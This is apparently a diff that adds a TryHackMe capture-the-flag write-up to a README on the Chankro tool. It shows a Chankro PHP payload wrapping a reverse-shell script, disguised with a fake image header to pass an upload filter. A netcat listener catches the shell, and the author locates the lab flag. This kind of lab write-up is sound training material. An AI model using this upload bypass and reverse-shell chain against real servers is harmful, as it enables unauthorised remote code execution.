@@ -28,3 +28,64 @@ python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/
 --input = file with your payload to execute
 --output = Name of the PHP file you are going to create; this is the file you will need to upload.
 --path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder DOCUMENTROOT + uploads. 
+
+
+Lets Go.... 
+
+First use : Nmap to scanning network 
+
+use command  : nmap -sV -A IP
+
+i found 22 and 80 port open 
+
+then i use gobuster to find directory 
+
+<img width="1601" height="468" alt="image" src="https://github.com/user-attachments/assets/70ceb895-dfc1-4c2b-bb25-caaa52ed26f7" />
+
+here i get to know the phpinfo.php file then i redirect on http://10.201.76.5/phpinfo.php this url and get to know so much information about lab
+
+then i use to  Chankro thne i create one rev.php file
+
+<img width="772" height="118" alt="image" src="https://github.com/user-attachments/assets/a237a6cd-c12b-441a-a759-ca4ff6d64418" />
+
+then i generate thm1.php file using 
+python2 chankro.py --arch 64 --input rev.sh --output thm1.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db 
+
+this command it generate thm1.php file 
+
+i convert that file image file because server ony store image
+<img width="1919" height="105" alt="image" src="https://github.com/user-attachments/assets/d7e3d0de-f0c1-45ff-9ced-efe4f61805bb" />
+
+see i add some GIB text in starting
+
+Now upload that file on http://10.201.76.5/cv.php
+
+<img width="1745" height="636" alt="image" src="https://github.com/user-attachments/assets/d83536e1-c134-4d8c-9575-0b63f8bbf665" />
+
+
+then i open http://10.201.76.5/uploads/
+
+
+<img width="853" height="485" alt="image" src="https://github.com/user-attachments/assets/7098b866-8a35-49ec-8723-758bd0f59984" />
+
+to user reverse shell i run first command
+
+nc -lvp 1234
+
+then click on thm1.php
+
+then oprn revese shell terminal after some seconds you will see
+
+<img width="904" height="786" alt="image" src="https://github.com/user-attachments/assets/2cf37455-c961-4cd7-8e08-d18f3a347615" />
+
+then file flag.txt command using find / -name "flag.txt" 2>/dev/null   this commad
+
+www-data@ubuntu:/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db$ find / -name "flag.txt" 2>/dev/null   
+<ml/fa5fba5f5a39d27d8bb7fe5f518e00db$ find / -name "flag.txt" 2>/dev/null    
+/home/s4vi/flag.txt
+
+
+then go on that file path you will and do cat flag.txt command you will get flag
+
+cat flag.txt
+thm{bypass_d1sable_functions_1n_php}
